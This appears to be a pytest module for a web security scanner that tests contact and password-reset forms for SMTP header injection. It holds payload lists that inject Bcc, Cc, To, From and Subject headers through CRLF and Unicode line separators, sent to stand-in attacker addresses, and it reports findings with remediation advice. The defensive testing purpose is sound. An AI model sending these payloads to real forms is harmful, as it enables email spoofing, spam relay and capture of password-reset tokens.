"""
SMTP Injection Tests

Tests for SMTP injection attacks including:
- CRLF injection
- CC/BCC injection
- Subject header injection
- From header injection
- Body injection
"""

import pytest

from utils.scanner import SecurityScanner, Finding, Severity, extract_forms

# SMTP injection payloads
BCC_PAYLOADS = [
    "victim@target.com\r\nBcc: evil@hacker.com",
    "victim@target.com%0D%0ABcc:%20evil@hacker.com",
    "victim@target.com\nBcc: evil@hacker.com",
    "victim@target.com%0ABcc:%20evil@hacker.com",
]

CC_PAYLOADS = [
    "victim@target.com\r\nCc: evil@hacker.com",
    "victim@target.com%0D%0ACc:%20evil@hacker.com",
]

SUBJECT_PAYLOADS = [
    "Test\r\nSubject: EVIL SUBJECT",
    "Test%0D%0ASubject:%20EVIL",
    "Test\r\nBcc: evil@hacker.com",
]

FROM_PAYLOADS = [
    "victim@target.com\r\nFrom: evil@hacker.com",
    "victim@target.com%0D%0AFrom:%20spoofed@evil.com",
]

BODY_PAYLOADS = [
    "Test\r\n.\r\nEVIL MESSAGE BODY",
    "Test%0D%0A.%0D%0AMAIL FROM:<evil@hacker.com>",
    "Test\r\n\r\nInjected body content",
]

UNICODE_CRLF_PAYLOADS = [
    "test@example.com\u000d\u000aBcc: evil@hacker.com",
    "test@example.com\u2028Bcc: evil@hacker.com",  # Line separator
    "test@example.com\u2029Bcc: evil@hacker.com",  # Paragraph separator
]


@pytest.fixture
def smtp_scanner(test_config):
    """Create scanner for SMTP injection tests."""
    return SecurityScanner(test_config)


class TestSMTPInjection:
    """SMTP injection test suite."""

    def _check_smtp_injection(self, scanner, form_action, form_data, payload_desc):
        """Check if SMTP injection was successful."""
        try:
            resp = scanner.post(form_action, data=form_data)

            if not resp or resp.status_code != 200:
                return False

            text = resp.text.lower()

            success_indicators = ["sent", "delivered", "queued", "success", "message sent", "email sent"]
            for indicator in success_indicators:
                if indicator in text:
                    return True

            return False
        except Exception:
            return False

    def _find_contact_forms(self, forms):
        """Find forms that look like contact/email forms."""
        contact_forms = []
        for form in forms[:5]:
            for inp in form.get("inputs", []):
                name = inp.get("name", "").lower()
                if "email" in name or "contact" in name or "message" in name or "subject" in name:
                    contact_forms.append(form)
                    break
        return contact_forms[:3]

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_bcc_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for BCC injection via email field."""
        resp = smtp_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        contact_forms = self._find_contact_forms(forms)

        for form in contact_forms:
            for inp in form["inputs"]:
                if "email" in inp["name"].lower():
                    for payload in BCC_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "BCC"):
                            finding = Finding(
                                title="BCC Injection via Email Field",
                                severity=Severity.HIGH,
                                description="CRLF injection allows adding BCC recipients to email messages",
                                url=form["action"],
                                evidence=f"Payload: {payload[:50]}...",
                                remediation="Sanitize email inputs to remove CRLF characters. Validate email format strictly.",
                                cwe_id="CWE-93",
                                owasp_category="A01:2021 - Broken Access Control",
                            )
                            findings_collector.add(finding)
                            smtp_scanner.add_finding(finding)
                            return

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_cc_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for CC injection via email field."""
        resp = smtp_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        contact_forms = self._find_contact_forms(forms)

        for form in contact_forms:
            for inp in form["inputs"]:
                if "email" in inp["name"].lower():
                    for payload in CC_PAYLOADS:
                        form_data = {inp["name"]: payload}

                        if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "CC"):
                            finding = Finding(
                                title="CC Injection via Email Field",
                                severity=Severity.HIGH,
                                description="CRLF injection allows adding CC recipients",
                                url=form["action"],
                                evidence=f"CC injection payload accepted",
                                remediation="Sanitize email inputs. Remove CRLF characters.",
                                cwe_id="CWE-93",
                                owasp_category="A01:2021 - Broken Access Control",
                            )
                            findings_collector.add(finding)
                            smtp_scanner.add_finding(finding)
                            return

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_subject_header_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for Subject header injection."""
        resp = smtp_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        contact_forms = self._find_contact_forms(forms)

        for form in contact_forms:
            subject_field = None
            email_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "subject" in name:
                    subject_field = inp["name"]
                elif "email" in name:
                    email_field = inp["name"]

            if subject_field:
                for payload in SUBJECT_PAYLOADS:
                    form_data = {subject_field: payload}
                    if email_field:
                        form_data[email_field] = "test@example.com"

                    if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "Subject"):
                        finding = Finding(
                            title="Subject Header Injection",
                            severity=Severity.HIGH,
                            description="Subject header can be injected via CRLF characters",
                            url=form["action"],
                            evidence="Subject injection payload accepted",
                            remediation="Sanitize subject field. Remove CRLF characters from input.",
                            cwe_id="CWE-93",
                            owasp_category="A01:2021 - Broken Access Control",
                        )
                        findings_collector.add(finding)
                        smtp_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_from_header_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for From header injection."""
        resp = smtp_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        contact_forms = self._find_contact_forms(forms)

        for form in contact_forms:
            email_field = None
            from_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "email" in name:
                    email_field = inp["name"]
                elif "from" in name:
                    from_field = inp["name"]

            target_field = from_field or email_field
            if target_field:
                for payload in FROM_PAYLOADS:
                    form_data = {target_field: payload}

                    if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "From"):
                        finding = Finding(
                            title="From Header Injection",
                            severity=Severity.HIGH,
                            description="From header can be injected via CRLF characters",
                            url=form["action"],
                            evidence="From injection payload accepted",
                            remediation="Sanitize email and from fields. Remove CRLF characters.",
                            cwe_id="CWE-93",
                            owasp_category="A01:2021 - Broken Access Control",
                        )
                        findings_collector.add(finding)
                        smtp_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_email_body_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for email body injection."""
        resp = smtp_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        contact_forms = self._find_contact_forms(forms)

        for form in contact_forms:
            message_field = None
            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "message" in name or "body" in name or "content" in name:
                    message_field = inp["name"]
                    break

            if message_field:
                for payload in BODY_PAYLOADS:
                    form_data = {
                        "email": "test@example.com",
                        message_field: payload
                    }

                    if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "Body"):
                        finding = Finding(
                            title="Email Body Injection via CRLF",
                            severity=Severity.HIGH,
                            description="Email body can be terminated and injected with malicious content",
                            url=form["action"],
                            evidence="Body termination payload accepted",
                            remediation="Sanitize message body content. Remove CRLF characters.",
                            cwe_id="CWE-93",
                            owasp_category="A01:2021 - Broken Access Control",
                        )
                        findings_collector.add(finding)
                        smtp_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_password_reset_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for password reset email injection."""
        reset_paths = ["/forgot-password", "/password/reset", "/reset-password", "/account/recover"]

        for path in reset_paths:
            url = f"{target_url}{path}"
            resp = smtp_scanner.get(url)

            if not resp or resp.status_code != 200:
                continue

            forms = extract_forms(resp.text, url)

            for form in forms[:2]:
                email_field = None
                for inp in form["inputs"]:
                    if "email" in inp["name"].lower():
                        email_field = inp["name"]
                        break

                if email_field:
                    for payload in BCC_PAYLOADS:
                        form_data = {email_field: payload}

                        if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "Reset"):
                            finding = Finding(
                                title="Password Reset BCC Injection",
                                severity=Severity.HIGH,
                                description="Password reset form allows BCC injection - attacker can receive reset tokens",
                                url=form["action"],
                                evidence="BCC injection in password reset",
                                remediation="Sanitize password reset form. Use random tokens. Validate email strictly.",
                                cwe_id="CWE-93",
                                owasp_category="A07:2021 - Identification and Authentication Failures",
                            )
                            findings_collector.add(finding)
                            smtp_scanner.add_finding(finding)
                            return

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_to_header_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for To header injection."""
        resp = smtp_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        contact_forms = self._find_contact_forms(forms)

        to_payloads = [
            "victim@target.com\r\nTo: evil@hacker.com",
            "victim@target.com%0D%0ATo:%20evil@hacker.com",
        ]

        for form in contact_forms:
            to_field = None
            email_field = None

            for inp in form["inputs"]:
                name = inp["name"].lower()
                if "to" in name:
                    to_field = inp["name"]
                elif "email" in name:
                    email_field = inp["name"]

            target_field = to_field or email_field
            if target_field:
                for payload in to_payloads:
                    form_data = {target_field: payload}

                    if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "To"):
                        finding = Finding(
                            title="To Header Injection",
                            severity=Severity.HIGH,
                            description="To header can be injected via CRLF characters",
                            url=form["action"],
                            evidence="To header injection payload accepted",
                            remediation="Sanitize email field. Reject input containing CRLF.",
                            cwe_id="CWE-93",
                            owasp_category="A01:2021 - Broken Access Control",
                        )
                        findings_collector.add(finding)
                        smtp_scanner.add_finding(finding)
                        return

    @pytest.mark.security
    @pytest.mark.smtp_injection
    def test_unicode_crlf_injection(self, smtp_scanner, target_url, findings_collector):
        """Test for Unicode CRLF injection variants."""
        resp = smtp_scanner.get(target_url)

        if not resp or resp.status_code != 200:
            pytest.skip("Could not access target")

        forms = extract_forms(resp.text, target_url)
        contact_forms = self._find_contact_forms(forms)

        for form in contact_forms:
            for inp in form["inputs"]:
                if "email" in inp["name"].lower():
                    for payload in UNICODE_CRLF_PAYLOADS:
                        try:
                            form_data = {inp["name"]: payload}

                            if self._check_smtp_injection(smtp_scanner, form["action"], form_data, "Unicode"):
                                finding = Finding(
                                    title="Unicode CRLF Injection",
                                    severity=Severity.HIGH,
                                    description=f"Unicode CRLF variant accepted - {repr(payload[:30])}",
                                    url=form["action"],
                                    evidence="Unicode line separator injection",
                                    remediation="Normalize Unicode input. Block all line separator characters.",
                                    cwe_id="CWE-93",
                                    owasp_category="A01:2021 - Broken Access Control",
                                )
                                findings_collector.add(finding)
                                smtp_scanner.add_finding(finding)
                                return
                        except Exception:
                            pass
